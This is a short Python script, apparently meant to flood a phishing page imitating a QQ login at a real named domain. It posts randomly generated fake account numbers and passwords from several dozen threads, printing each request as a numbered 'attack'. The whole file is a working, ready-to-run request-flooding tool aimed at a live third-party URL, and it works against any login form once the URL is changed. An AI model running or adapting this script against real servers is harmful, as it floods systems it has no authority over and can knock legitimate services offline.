import requests
from bs4 import BeautifulSoup
import random
import _thread
count = 1
def attack() :
    global count
    url = 'http://www.girlwin.com.cn/qq/qq.php'
    headers ={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36'
    }
    while count < 5000 :
        qqnumber = str(random.randint(1,2)) + str(random.randint(234567890,987654321))
        pwd = random.choice('abcdef123456789mnopq!@#$*') + random.choice('abcdef123456789mnopq!@#$*') + random.choice('abcdef123456789mnopq!@#$*') + str(random.randint(10**6,10**7-1))
        datas = {
            'user': qqnumber,
            'password': pwd
        }
        res = requests.post(url,headers = headers,data=datas)
        count += 1
        print('第',count,'次攻击','帐号:',qqnumber,'密码:',pwd,'攻击状态：',res.status_code)
try:
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
    _thread.start_new_thread(attack,())
except:
    print("线程结束！")
while 1:
    pass